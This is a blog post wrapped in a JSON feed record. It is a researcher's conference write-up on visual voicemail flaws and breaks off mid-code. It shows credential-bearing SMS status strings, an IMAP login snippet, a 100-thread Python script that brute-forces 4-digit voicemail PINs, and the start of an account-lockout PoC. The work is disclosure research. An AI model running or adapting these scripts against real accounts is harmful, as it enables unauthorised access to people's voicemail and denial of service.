{"code":1,"isDone":false,"toInsertArticleList":[{"createdTime":"2020-10-14 11:43:27","updatedTime":"2020-10-14 11:43:27","title":"Breaking International Voicemail Security via VVM Exploitation","link":"http://shubs.io/breaking-international-voicemail-security-via-vvm-exploitation/","description":"<script type=\"text/javascript\" src=\"https://ajblk.github.io/SyntaxHighlightGenerator-v3.0/scripts/sh-v3.0-min.js\"></script>  \n\n<p><link type=\"text/css\" rel=\"stylesheet\" href=\"https://ajblk.github.io/SyntaxHighlightGenerator-v3.0/styles/shCoreRDark.css\"></p>\n\n<p>A few days ago, I gave a presentation at <a href=\"http://ruxcon.org.au/speakers/\">Ruxcon</a> about breaking international voicemail security. Whilst the crowd and conference were absolutely amazing - my overall research, I think has a much wider scope in the terms of whom it could affect. This blog post acts as a technical writeup and companion to <a href=\"https://docs.google.com/file/d/0B0qCSz--ApI7X0F4ZVBnajNWMUU/edit?usp=drive_web\">my slides</a> presented at Ruxcon.</p>\n\n<p><strong>TL;DR</strong> Briefly put, through researching the <a href=\"http://shubs.io/breaking-international-voicemail-security-via-vvm-exploitation/en.wikipedia.org/wiki/Visual_voicemail\">visual voicemail protocol</a>, we were able to document a number of different vulnerabilities, including some which affected the <a href=\"http://en.wikipedia.org/wiki/Vodafone_Hutchison_Australia\">third largest telco in Australia</a> (30% market share) however the findings could affect a large number of other telco's internationally.</p>\n\n<p>In particular, these vulnerabilities allowed for the breach of any single voicemail account in a major service provider in Australia - a 3 minute pin crack at most.</p>\n\n<p>If you want to jump to the action, click <a href=\"http://shubs.io/breaking-international-voicemail-security-via-vvm-exploitation/#demo\">here</a> to see the demo.</p>\n\n<p>To some who have already listened to me talk about this, it may feel like I'm stuck on a single topic and rambling. This is not the case, I merely wish to make it possible for others to test and report these issues to their carriers. Otherwise, I don't think we can inherently trust voicemail.</p>\n\n<p>It goes without saying, however all of this research was done and completed as a private citizen - it is not affiliated with any company or person other than myself and Huey. </p>\n\n<h2 id=\"tableofcontents\">Table of Contents</h2>\n\n<ol>\n<li><a href=\"http://shubs.io/breaking-international-voicemail-security-via-vvm-exploitation/#analysis\"><strong>Analysis of the VVM protocol</strong></a>  </li>\n<li><a href=\"http://shubs.io/breaking-international-voicemail-security-via-vvm-exploitation/#vulnclasses\"><strong>Vulnerability Classes in the VVM protocol</strong></a>  </li>\n<li><a href=\"http://shubs.io/breaking-international-voicemail-security-via-vvm-exploitation/#mitigation\"><strong>Mitigation Techniques</strong></a>  </li>\n<li><a href=\"http://shubs.io/breaking-international-voicemail-security-via-vvm-exploitation/#responsible\"><strong>Responsible Disclosure</strong></a>  </li>\n<li><a href=\"http://shubs.io/breaking-international-voicemail-security-via-vvm-exploitation/#notes\"><strong>Final notes</strong></a></li>\n</ol>\n\n<hr>\n\n<p id=\"analysis\"> </p>\n\n<h3 id=\"analysisofthevvmprotocol\">Analysis of the VVM protocol</h3>\n\n<h4 id=\"whatisvisualvoicemail\">What is visual voicemail?</h4>\n\n<p>Visual voicemail is a relatively new voicemail technology when compared with traditional phone based voicemail systems. In a few words: <strong>visual voicemail is a way to listen and interact with your voicemails through a graphical interface</strong>. VVM was first heavily publicised in <a href=\"http://shubs.io/breaking-international-voicemail-security-via-vvm-exploitation/en.wikipedia.org/wiki/Visual_voicemail\">2007</a> with the release of the iPhone 2G which contained a native client to handle visual voicemail systems.</p>\n\n<p><img src=\"http://shubs.io/content/images/2014/Oct/iphone-visual-voicemail-1.jpg\" alt=\"\"></p>\n\n<p>Being able to access your voicemail visually without the need of all the extra prompts and annoyances striked great support and today visual voicemail exists in most carriers around the world. However the introduction of visual voicemail in itself created a whole new surface area which could be targeted to gain access to someones voicemail. </p>\n\n<p>Under the hood, when visual voicemail is used, the visual voicemail client connects to an <strong>IMAP</strong> server in the background. The authentication process is done fairly seemlessly, and most of the times, no pin prompt is required. </p>\n\n<p>Any voicemails ever left via the phone to you are then forwarded to the inbox of your personal email-like account and a two way relationship is formed. Actions made through visual voicemail are forwarded on to reflect changes on legacy voicemail servers.</p>\n\n<h4 id=\"technicaldetailsandprerequisites\">Technical Details and Pre-requisites</h4>\n\n<p>Unfortunately, even though visual voicemail was released in 2007, the greater public only received documentation on how visual voicemail servers are implemented in 2012. </p>\n\n<p>I myself, am unsure if Apple provided exclusive documentation on best practices to Telco's - however in my close analysis of three visual voicemail servers (two in Australia and one in America), they seem to all be differently configured. This may suggest that there are no best practices in the way that these VVM servers are configured.</p>\n\n<p>Before digging deep into the technical details of visual voicemail, let's discuss the pre-requisites to merely access the servers:</p>\n\n<ul>\n<li>Must be on a service provider which supports visual voicemail:\n<ul><li>You can find a very handy list over <a href=\"http://support.apple.com/kb/ht1937\">here</a>.</li></ul></li>\n<li>You <em>may</em> have to be on the ISPs internet connection i.e. <strong>3G, 4G, etc</strong>.\n<ul><li>Note: For all the VVM servers I've tested, you need 3g/4g/ISP internet access.</li></ul></li>\n<li>In order to easily intercept and understand the VVM connection happening, you'll need to have an iPhone. Preferably also a computer running OSX with XCode.\n<ul><li>By having this, you can natively take network traffic pcap dumps whilst the iphone is connected to 3g/4g.</li></ul></li>\n</ul>\n\n<p>If you meet these pre-requisites, you are all ready to test and find VVM related flaws. For the more broken down analysis about to follow, I recommend you take a look at the public specification for visual voicemail released via the GSMA by OMTP in 2012. </p>\n\n<p>It can be found here: <a href=\"http://www.gsma.com/newsroom/wp-content/uploads/2012/03/omtpvvmspecification12.pdf\">http://www.gsma.com/newsroom/wp-content/uploads/2012/03/omtpvvmspecification12.pdf</a>.</p>\n\n<blockquote>\n  <p>Authentication</p>\n</blockquote>\n\n<p>One might be wondering, if you aren't required to enter a voicemail password when opening the visual voicemail screen, how does authentication occur? Good question.</p>\n\n<p>The authentication to the VVM server is done, usually, via Class 0 SMS messages (aka. flash messages). For those that haven't heard of such a thing before, these messages are essentially a way for the mobile service provider to send you a message which you cannot view on the user level however can be interpreted by the mobile itself to do a particular action (i.e. set up visual voicemail). Once a Class 0 SMS messages is sent, the service provider can check if they are successful based on whether or not a receipt is sent back or not.</p>\n\n<p>On the iPhone, these Class 0 messages are not exactly viewable easily - however on Android's or much older mobile phones, it is much easier to grab these SMS messages. In the OMTP document <a href=\"http://www.gsma.com/newsroom/wp-content/uploads/2012/03/omtpvvmspecification12.pdf\">here</a>, it mentions that a \"STATUS\" Class 0 message is sent with a string that passes on the authentication and server details to the phone.</p>\n\n<p>Class 0 messages are used for much more than just VVM authentication, you can find a list of other things they are used for <a href=\"http://en.wikipedia.org/wiki/Short_Message_Service#Flash_SMS\">here</a>.</p>\n\n<p>The example message used in the specification is the following:</p>\n\n<p><code>//VVM:STATUS:st=N;rc=0;srv=1:10.115.67.251;tui=123;dn=999;ipt=143; spt=25; u=78236487@wirelesscarrier.com;pw=32u4yguetrr34; lang=eng|fre;g_len=25;vs_len=15;pw_len=4-6; smtp_u=super_user@wirelesscarrier.com; smtp_pw=48769463wer;pm=Y;gm=N;</code></p>\n\n<p>In this message, we can easily recognise that <strong>srv</strong> is the IMAP server IP address/host, <strong>ipt</strong> is the port of this address/host, <strong>u</strong> is the username of the IMAP user for the VVM server and <strong>pw</strong> is the password of the user. Here the SMTP user and pass are also specified, however this is not always the case.</p>\n\n<p>Let's look at a real life example: T-Mobile visual voicemail status message - </p>\n\n<p><code>VVM:STATUS:st=R;rc=0;srv=vvm.tmomail.net;ipt=143;u=0000000000@vms.eng.t-mobile.com;pw=BOQ8CAzzNcu;lang=1|2|3|4;g_len=180;vs_len=10;pw_len=4-9</code></p>\n\n<p>Quite similar.</p>\n\n<p>Once the iPhone is authenticated to visual voicemail, all the user needs to do is open the dialer app and click the voicemail tab. If their service provider supports it, and all the pre-requisites are met - they now have access to visual voicemail.</p>\n\n<p><img src=\"http://shubs.io/content/images/2014/Oct/Screen-Shot-2014-10-16-at-9-20-08-pm.png\" alt=\"\"></p>\n\n<blockquote>\n  <p>Misc Functionality</p>\n</blockquote>\n\n<p>As per the specification, the VVM server might have some special functionalities compared to traditional IMAP servers:</p>\n\n<p>In the specification itself, you may find details about the following:</p>\n\n<ul>\n<li>Voice Message Example</li>\n<li>Video Message Example</li>\n<li>Fax Message Example</li>\n<li>ECC Message Example</li>\n<li>Number Message Example</li>\n<li>Voice DSN Message Example</li>\n<li>Voice Message Disposition Notification Message Example</li>\n<li>Deposit Voice Message Example</li>\n<li>Greeting Message Example</li>\n<li>Deposit Voice Message Example</li>\n</ul>\n\n<p>I don't cover these aspects here as they are irrelevent to my later research.</p>\n\n<p><img src=\"http://shubs.io/content/images/2014/Oct/57.jpg\" alt=\"\"></p>\n\n<p id=\"getvvmdeets\"></p>  \n\n<h4 id=\"capturingthevvmauthenticationdetails\">Capturing the VVM Authentication details</h4>\n\n<p><img src=\"http://shubs.io/content/images/2014/Oct/Screen-Shot-2014-10-16-at-9-23-08-pm.png\" alt=\"\"></p>\n\n<p>iPhone Backup Analysis Example:</p>\n\n<p><img src=\"http://shubs.io/content/images/2014/Oct/Screen-Shot-2014-10-16-at-9-24-03-pm.png\" alt=\"\"></p>\n\n<hr>\n\n<p id=\"vulnclasses\"> </p>\n\n<h3 id=\"vulnerabilityclasses\">Vulnerability Classes</h3>\n\n<h4 id=\"bruteforcing\">Bruteforcing</h4>\n\n<p>By now, most readers must have already recognised that the ability to connect to an IMAP server introduces a whole new field of possible vulnerabilities. One, by far the most obvious, being <strong>bruteforce vulnerabilities.</strong></p>\n\n<p>Based off the two SMS Class 0 Status messages I showed above, i.e. that being something like this:</p>\n\n<p><code>VVM:STATUS:st=R;rc=0;srv=vvm.tmomail.net;ipt=143;u=0000000000@vms.eng.t-mobile.com;pw=BOQ8CAzzNcu;lang=1|2|3|4;g_len=180;vs_len=10;pw_len=4-9</code></p>\n\n<p>You can easily recognise that the <strong>pw</strong> is a long alphanumeric mixed case string - and really, regardless of the lack of  rate limiting and account lockouts, it would be impractical to bruteforce these passwords.</p>\n\n<p>However, let's take the example of the third largest provider in Australia, and more so, the potential case in many more providers around the world.</p>\n\n<p><strong>What if the visual voicemail \"pw\" was the same as the users actual voicemail password? (This happens more than you can imagine)</strong></p>\n\n<p>I talked earlier about how no public specification existed till mid-late 2012, whilst VVM had been implemented in many mobile providers since 2007. I speculate that the lack of direction and documentation on best practices, as well as laziness or ignorance has lead to such a vulnerability class being introduced to VVM.</p>\n\n<p>A VVM server vulnerable to basic bruteforce attacks, might send out a Class 0 SMS Status message which looks something like this instead:</p>\n\n<p><code>VVM:STATUS:st=R;rc=0;srv=vvm.vulnvvm.net;ipt=143;u=0000000000@vms.vulnvvm.com;pw=3915;lang=1|2|3|4;g_len=180;vs_len=10;pw_len=4-9</code></p>\n\n<p>See the <strong>\"pw\"</strong> field? 4 digits. 10,000 combinations. 3 minute pin crack? Priceless.</p>\n\n<p>If a user picked the pin <code>3159</code> when setting up their voicemail account, that same pin really is not suited to be their visual voicemail password also. I know that one could even start up an <a href=\"http://www.asterisk.org/\">Asterisk</a> script to brute pins via the telephone - but at the same time, it's very unfeasible to execute and may take much much longer than going through visual voicemail - an IMAP server. Adding on, it seems to me that visual voicemail servers lack the lockouts. So far, from 3 servers tested initially, we were unable to find any account lockouts.</p>\n\n<p>So let's get technical. First thing you need is the visual voicemail server details and a working username and password. You can get this by using the methods I describe above <a href=\"http://shubs.io/breaking-international-voicemail-security-via-vvm-exploitation/#getvvmdeets\">here</a>. Once you've got this, let's start by actually trying to authenticating to this server.</p>\n\n<p><strong>Note: you will need to be on the mobile providers internet connection  (3g/4g/_) tethering from your mobile is an easy way to do this.</strong></p>\n\n<h5 id=\"connectingtothevvmserver\">Connecting to the VVM server</h5>\n\n<div id=\"highlighterMainDiv_576583\" class=\"syntaxhighlighter python\"><div id=\"toolbarContainer_576583\" class=\"toolbar\"><span><a href=\"http://shubs.io/breaking-international-voicemail-security-via-vvm-exploitation/#\" class=\"toolbar_item command_help help\">?</a></span></div><table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><caption>Authenticating to the VVM Server</caption><tbody><tr><td class=\"gutter\"><div class=\"line number1 index0 alt2\">1</div><div class=\"line number2 index1 alt1\">2</div><div class=\"line number3 index2 alt2\">3</div><div class=\"line number4 index3 alt1\">4</div></td><td id=\"codeContainer_576583\" class=\"code\"><div id=\"container_576583\" class=\"container\"><div class=\"line number1 index0 alt2\"><code class=\"python keyword\">import</code> <code class=\"python plain\">imaplib</code></div><div class=\"line number2 index1 alt1\"><code class=\"python plain\">mail </code><code class=\"python keyword\">=</code> <code class=\"python plain\">imaplib.IMAP4_SSL(</code><code class=\"python string\">'vvm.example.com.au'</code><code class=\"python plain\">)</code></div><div class=\"line number3 index2 alt2\"><code class=\"python plain\">mail.login(</code><code class=\"python string\">'61410061410@vvm.example.com.au'</code><code class=\"python plain\">, </code><code class=\"python string\">'8454'</code><code class=\"python plain\">)</code></div><div class=\"line number4 index3 alt1\"><code class=\"python plain\">mail.</code><code class=\"python functions\">list</code><code class=\"python plain\">()</code></div></div></td></tr></tbody></table></div>\n\n<pre id=\"presourcecode_576583\" class=\"displaysourcecode\">  \nimport imaplib  \nmail = imaplib.IMAP4_SSL('vvm.example.com.au')  \nmail.login('61410061410@vvm.example.com.au', '8454')  \nmail.list()  \n</pre>\n\n<p>Incredibly simple. However, using this script, you can easily debug the connection until you successfuly log in. Essentially, this script is to merely confirm that the VVM server is reachable and that you can connect.</p>\n\n<h5 id=\"bruteforcingpocforthevvmserver\">Bruteforcing PoC for the VVM server</h5>\n\n<p>So, now we can programmatically connect to the VVM server, bruteforcing should be a piece of cake. Below is a <strong>Python 3</strong> PoC which attempts to bruteforce a VVM server which uses <strong>PLAIN-Auth</strong>. This PoC utilises <strong>100 workers/threads</strong> and ultimately depending on your connection, allows for an incredibly fast pin crack (3 mins or less).</p>\n\n<div id=\"highlighterMainDiv_805899\" class=\"syntaxhighlighter python\"><div id=\"toolbarContainer_805899\" class=\"toolbar\"><span><a href=\"http://shubs.io/breaking-international-voicemail-security-via-vvm-exploitation/#\" class=\"toolbar_item command_help help\">?</a></span></div><table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><caption>Multithreaded VVM Account Bruteforcing</caption><tbody><tr><td class=\"gutter\"><div class=\"line number1 index0 alt2\">01</div><div class=\"line number2 index1 alt1\">02</div><div class=\"line number3 index2 alt2\">03</div><div class=\"line number4 index3 alt1\">04</div><div class=\"line number5 index4 alt2\">05</div><div class=\"line number6 index5 alt1\">06</div><div class=\"line number7 index6 alt2\">07</div><div class=\"line number8 index7 alt1\">08</div><div class=\"line number9 index8 alt2\">09</div><div class=\"line number10 index9 alt1\">10</div><div class=\"line number11 index10 alt2\">11</div><div class=\"line number12 index11 alt1\">12</div><div class=\"line number13 index12 alt2\">13</div><div class=\"line number14 index13 alt1\">14</div><div class=\"line number15 index14 alt2\">15</div><div class=\"line number16 index15 alt1\">16</div><div class=\"line number17 index16 alt2\">17</div><div class=\"line number18 index17 alt1\">18</div><div class=\"line number19 index18 alt2\">19</div><div class=\"line number20 index19 alt1\">20</div><div class=\"line number21 index20 alt2\">21</div><div class=\"line number22 index21 alt1\">22</div><div class=\"line number23 index22 alt2\">23</div><div class=\"line number24 index23 alt1\">24</div><div class=\"line number25 index24 alt2\">25</div><div class=\"line number26 index25 alt1\">26</div><div class=\"line number27 index26 alt2\">27</div><div class=\"line number28 index27 alt1\">28</div><div class=\"line number29 index28 alt2\">29</div><div class=\"line number30 index29 alt1\">30</div><div class=\"line number31 index30 alt2\">31</div></td><td id=\"codeContainer_805899\" class=\"code\"><div id=\"container_805899\" class=\"container\"><div class=\"line number1 index0 alt2\"><code class=\"python keyword\">import</code> <code class=\"python plain\">imaplib</code></div><div class=\"line number2 index1 alt1\"><code class=\"python keyword\">import</code> <code class=\"python plain\">itertools</code></div><div class=\"line number3 index2 alt2\"><code class=\"python keyword\">import</code> <code class=\"python plain\">string</code></div><div class=\"line number4 index3 alt1\"><code class=\"python keyword\">import</code> <code class=\"python plain\">time</code></div><div class=\"line number5 index4 alt2\"><code class=\"python keyword\">import</code> <code class=\"python plain\">futures</code></div><div class=\"line number6 index5 alt1\">&#160;</div><div class=\"line number7 index6 alt2\"><code class=\"python plain\">combolist </code><code class=\"python keyword\">=</code> <code class=\"python plain\">[\"\".join(</code><code class=\"python functions\">list</code><code class=\"python plain\">(x)) </code><code class=\"python keyword\">for</code> <code class=\"python plain\">x </code><code class=\"python keyword\">in</code> <code class=\"python plain\">itertools.product(string.digits, repeat</code><code class=\"python keyword\">=</code><code class=\"python value\">4</code><code class=\"python plain\">)]</code></div><div class=\"line number8 index7 alt1\"><code class=\"python plain\">overall_start </code><code class=\"python keyword\">=</code> <code class=\"python plain\">time.time()</code></div><div class=\"line number9 index8 alt2\">&#160;</div><div class=\"line number10 index9 alt1\"><code class=\"python keyword\">def</code> <code class=\"python plain\">brute(password):</code></div><div class=\"line number11 index10 alt2\"><code class=\"python spaces\">&#160;&#160;&#160;&#160;</code><code class=\"python plain\">username </code><code class=\"python keyword\">=</code> <code class=\"python string\">\"61410061410@vvm.example.com.au\"</code></div><div class=\"line number12 index11 alt1\"><code class=\"python spaces\">&#160;&#160;&#160;&#160;</code><code class=\"python plain\">start_time </code><code class=\"python keyword\">=</code> <code class=\"python plain\">time.time()</code></div><div class=\"line number13 index12 alt2\"><code class=\"python spaces\">&#160;&#160;&#160;&#160;</code><code class=\"python keyword\">try</code><code class=\"python plain\">:</code></div><div class=\"line number14 index13 alt1\"><code class=\"python spaces\">&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</code><code class=\"python plain\">mail </code><code class=\"python keyword\">=</code> <code class=\"python plain\">imaplib.IMAP4_SSL(</code><code class=\"python string\">'vvm.example.com.au'</code><code class=\"python plain\">)</code></div><div class=\"line number15 index14 alt2\"><code class=\"python spaces\">&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</code><code class=\"python keyword\">try</code><code class=\"python plain\">:</code></div><div class=\"line number16 index15 alt1\"><code class=\"python spaces\">&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</code><code class=\"python plain\">mail.login(</code><code class=\"python string\">'61410061410@vvm.example.com.au'</code><code class=\"python plain\">, password)</code></div><div class=\"line number17 index16 alt2\"><code class=\"python spaces\">&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</code><code class=\"python plain\">mail.</code><code class=\"python functions\">list</code><code class=\"python plain\">()</code></div><div class=\"line number18 index17 alt1\"><code class=\"python spaces\">&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</code><code class=\"python functions\">print</code><code class=\"python plain\">(</code><code class=\"python string\">\"{0}:{1} worked!\"</code><code class=\"python plain\">.</code><code class=\"python functions\">format</code><code class=\"python plain\">(username, password))</code></div><div class=\"line number19 index18 alt2\"><code class=\"python spaces\">&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</code><code class=\"python plain\">with </code><code class=\"python functions\">open</code><code class=\"python plain\">(</code><code class=\"python string\">'oput.txt'</code><code class=\"python plain\">, </code><code class=\"python string\">'a'</code><code class=\"python plain\">) as output:</code></div><div class=\"line number20 index19 alt1\"><code class=\"python spaces\">&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</code><code class=\"python plain\">output.write(</code><code class=\"python string\">\"{0}:{1} worked!\\n\"</code><code class=\"python plain\">.</code><code class=\"python functions\">format</code><code class=\"python plain\">(username, password))</code></div><div class=\"line number21 index20 alt2\"><code class=\"python spaces\">&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</code><code class=\"python keyword\">return</code> <code class=\"python plain\">password</code></div><div class=\"line number22 index21 alt1\"><code class=\"python spaces\">&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</code><code class=\"python keyword\">except</code> <code class=\"python plain\">Exception as e:</code></div><div class=\"line number23 index22 alt2\"><code class=\"python spaces\">&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</code><code class=\"python keyword\">print</code><code class=\"python plain\">(</code><code class=\"python string\">\"Login error (trying {1}): {0}\"</code><code class=\"python plain\">.</code><code class=\"python functions\">format</code><code class=\"python plain\">(e, password))</code></div><div class=\"line number24 index23 alt1\"><code class=\"python spaces\">&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</code><code class=\"python plain\">with </code><code class=\"python functions\">open</code><code class=\"python plain\">(</code><code class=\"python string\">'error_oput.txt'</code><code class=\"python plain\">, </code><code class=\"python string\">'a'</code><code class=\"python plain\">) as error_output:</code></div><div class=\"line number25 index24 alt2\"><code class=\"python spaces\">&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</code><code class=\"python plain\">error_output.write(</code><code class=\"python string\">\"{0}:{1} failed!\\n\"</code><code class=\"python plain\">.</code><code class=\"python functions\">format</code><code class=\"python plain\">(username, password))</code></div><div class=\"line number26 index25 alt1\"><code class=\"python spaces\">&#160;&#160;&#160;&#160;</code><code class=\"python keyword\">except</code> <code class=\"python plain\">Exception as e:</code></div><div class=\"line number27 index26 alt2\"><code class=\"python spaces\">&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</code><code class=\"python keyword\">print</code><code class=\"python plain\">(</code><code class=\"python string\">\"Connection error (trying {1}: {0}\"</code><code class=\"python plain\">.</code><code class=\"python functions\">format</code><code class=\"python plain\">(e, password))</code></div><div class=\"line number28 index27 alt1\"><code class=\"python spaces\">&#160;&#160;&#160;&#160;</code><code class=\"python keyword\">print</code><code class=\"python plain\">(</code><code class=\"python string\">\"attempt took: {0}\"</code><code class=\"python plain\">.</code><code class=\"python functions\">format</code><code class=\"python plain\">(time.time() </code><code class=\"python keyword\">-</code> <code class=\"python plain\">start_time))</code></div><div class=\"line number29 index28 alt2\">&#160;</div><div class=\"line number30 index29 alt1\"><code class=\"python plain\">with futures.ThreadPoolExecutor(max_workers</code><code class=\"python keyword\">=</code><code class=\"python value\">100</code><code class=\"python plain\">) as executor:</code></div><div class=\"line number31 index30 alt2\"><code class=\"python spaces\">&#160;&#160;&#160;&#160;</code><code class=\"python plain\">pages </code><code class=\"python keyword\">=</code> <code class=\"python plain\">executor.</code><code class=\"python functions\">map</code><code class=\"python plain\">(brute, (password </code><code class=\"python keyword\">for</code> <code class=\"python plain\">password </code><code class=\"python keyword\">in</code> <code class=\"python plain\">combolist))</code></div></div></td></tr></tbody></table></div>\n\n<pre id=\"presourcecode_805899\" class=\"displaysourcecode\">  \nimport imaplib  \nimport itertools  \nimport string  \nimport time  \nimport futures\n\ncombolist = [\"\".join(list(x)) for x in itertools.product(string.digits, repeat=4)]  \noverall_start = time.time()\n\ndef brute(password):  \n    username = \"61410061410@vvm.example.com.au\"\n    start_time = time.time()\n    try:\n        mail = imaplib.IMAP4_SSL('vvm.example.com.au')\n        try:\n            mail.login('61410061410@vvm.example.com.au', password)\n            mail.list()\n            print(\"{0}:{1} worked!\".format(username, password))\n            with open('oput.txt', 'a') as output:\n                output.write(\"{0}:{1} worked!\\n\".format(username, password))\n            return password\n        except Exception as e:\n            print(\"Login error (trying {1}): {0}\".format(e, password))\n            with open('error_oput.txt', 'a') as error_output:\n                error_output.write(\"{0}:{1} failed!\\n\".format(username, password))\n    except Exception as e:\n        print(\"Connection error (trying {1}: {0}\".format(e, password))\n    print(\"attempt took: {0}\".format(time.time() - start_time))\n\nwith futures.ThreadPoolExecutor(max_workers=100) as executor:  \n    pages = executor.map(brute, (password for password in combolist))\n</pre>\n\n<p>What does this look like in action?</p>\n\n<p>Here's the demo of the script above, running on the now patched visual voicemail server for Vodafone Australia.  </p>\n\n<p id=\"demo\"></p>  \n\n<p><img src=\"https://i.imgur.com/31jWiuy.gif\" alt=\"\"></p>\n\n<p>To put this into perspective:</p>\n\n<ul>\n<li>Two major mobile network providers, out of a total three, were vulnerable in <a href=\"https://shubh.am/how-i-bypassed-2-factor-authentication-on-google-yahoo-linkedin-and-many-others/\">some way or another</a> allowing an attacker arbitrary access to voicemail accounts</li>\n<li>Gaining access to ones voicemail without permission is still incredibly easy in 2014</li>\n</ul>\n\n<p>The above exploit with Vodafone was fixed months ago through a responsible disclosure process. Vodafone responded quite quickly, had a preliminary patch in place within hours and pushed a completed patch in a matter of days.</p>\n\n<h4 id=\"accountdos\">Account DoS</h4>\n\n<p>So, for the above exploit, how would you mitigate it as a service provider? Would you try to block the attacker, or would you lock out an account after <code>x</code> attempts to login. Surprisingly, the default model for voicemail is the latter.</p>\n\n<p>When calling through to a traditional voicemail number - trying five or more times for most Australian mobile networks, prompts an account lock out.</p>\n\n<p>This model is not necessarily bad, but it also introduces a vulnerability class - the ability to mass DoS accounts and lock them out.</p>\n\n<p>What's the PoC you ask?</p>\n\n<div id=\"highlighterMainDiv_805899\" class=\"syntaxhighlighter python\"><div id=\"toolbarContainer_805899\" class=\"toolbar\"><span><a href=\"http://shubs.io/breaking-international-voicemail-security-via-vvm-exploitation/#\" class=\"toolbar_item command_help help\">?</a></span></div><table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><caption>Multithreaded VVM Account Bruteforcing</caption><tbody><tr><td class=\"gutter\"><div class=\"line number1 index0 alt2\">01</div><div class=\"line number2 index1 alt1\">02</div><div class=\"line number3 index2 alt2\">03</div><div class=\"line number4 index3 alt1\">04</div><div class=\"line number5 index4 alt2\">05</div><div class=\"line number6 index5 alt1\">06</div><div class=\"line number7 index6 alt2\">07</div><div class=\"line number8 index7 alt1\">08</div><div class=\"line number9 index8 alt2\">09</div><div class=\"line number10 index9 alt1\">10</div><div class=\"line number11 index10 alt2\">11</div><div class=\"line number12 index11 alt1\">12</div><div class=\"line number13 index12 alt2\">13</div><div class=\"line number14 index13 alt1\">14</div><div class=\"line number15 index14 alt2\">15</div><div class=\"line number16 index15 alt1\">16</div><div class=\"line number17 index16 alt2\">17</div><div class=\"line number18 index17 alt1\">18</div><div class=\"line number19 index18 alt2\">19</div><div class=\"line number20 index19 alt1\">20</div><div class=\"line number21 index20 alt2\">21</div><div class=\"line number22 index21 alt1\">22</div><div class=\"line number23 index22 alt2\">23</div><div class=\"line number24 index23 alt1\">24</div><div class=\"line number25 index24 alt2\">25</div><div class=\"line number26 index25 alt1\">26</div><div class=\"line number27 index26 alt2\">27</div><div class=\"line number28 index27 alt1\">28</div><div class=\"line number29 index28 alt2\">29</div><div class=\"line number30 index29 alt1\">30</div><div class=\"line number31 index30 alt2\">31</div></td><td id=\"codeContainer_805899\" class=\"code\"><div id=\"container_805899\" class=\"container\"><div class=\"line number1 index0 alt2\"><code class=\"python keyword\">import</code> <code class=\"python plain\">imaplib</code></div><div class=\"line number2 index1 alt1\"><code class=\"python keyword\">import</code> <code class=\"python plain\">itertools</code></div><div class=\"line number3 index2 alt2\"><code class=\"python keyword\">import</code> <code class=\"python plain\">string</code></div><div class=\"line number4 index3 alt1\"><code class=\"python keyword\">import</code> <code class=\"python plain\">time</code></div><div class=\"line number5 index4 alt2\"><code class=\"python keyword\">import</code> <code class=\"python plain\">futures</code></div><div class=\"line number6 index5 alt1\">&#160;</div><div class=\"line number7 index6 alt2\"><code class=\"python plain\">combolist </code><code class=\"python keyword\">=</code> <code class=\"python plain\">[\"\".join(</code><code class=\"python functions\">list</code><code class=\"python plain\">(x)) </code><code class=\"python keyword\">for</code> <code class=\"python plain\">x </code><code class=\"python keyword\">in</code> <code class=\"python plain\">itertools.product(string.digits, repeat</code><code class=\"python keyword\">=</code><code class=\"python value\">4</code><code class=\"python plain\">)]</code></div><div class=\"line number8 index7 alt1\"><code class=\"python plain\">overall_start </code><code class=\"python keyword\">=</code> <code class=\"python plain\">time.time()</code></div><div class=\"line number9 index8 alt2\">&#160;</div><div class=\"line number10 index9 alt1\"><code class=\"python keyword\">def</code> <code class=\"python plain\">brute(password):</code></div><div class=\"line number11 index10 alt2\"><code class=\"python spaces\">&#160;&#160;&#160;&#160;</code><code class=\"python plain\">username </code><code class=\"python keyword\">=</code> <code class=\"python string\">\"61410061410@vvm.example.com.au\"</code></div><div class=\"line number12 index11 alt1\"><code class=\"python spaces\">&#160;&#160;&#160;&#160;</code><code class=\"python plain\">start_time </code><code class=\"python keyword\">=</code> <code class=\"python plain\">time.time()</code></div><div class=\"line number13 index12 alt2\"><code class=\"python spaces\">&#160;&#160;&#160;&#160;</code><code class=\"python keyword\">try</code><code class=\"python plain\">:</code></div><div class=\"line number14 index13 alt1\"><code class=\"python spaces\">&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</code><code class=\"python plain\">mail </code><code class=\"python keyword\">=</code> <code class=\"python plain\">imaplib.IMAP4_SSL(</code><code class=\"python string\">'vvm.example.com.au'</code><code class=\"python plain\">)</code></div><div class=\"line number15 index14 alt2\"><code class=\"python spaces\">&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</code><code class=\"python keyword\">try</code><code class=\"python plain\">:</code></div><div class=\"line number16 index15 alt1\"><code class=\"python spaces\">&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</code><code class=\"python plain\">mail.login(</code><code class=\"python string\">'61410061410@vvm.example.com.au'</code><code class=\"python plain\">, password)</code></div><div class=\"line number17 index16 alt2\"><code class=\"python spaces\">&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</code><code class=\"python plain\">mail.</code><code class=\"python functions\">list</code><code class=\"python plain\">()</code></div><div class=\"line number18 index17 alt1\"><code class=\"python 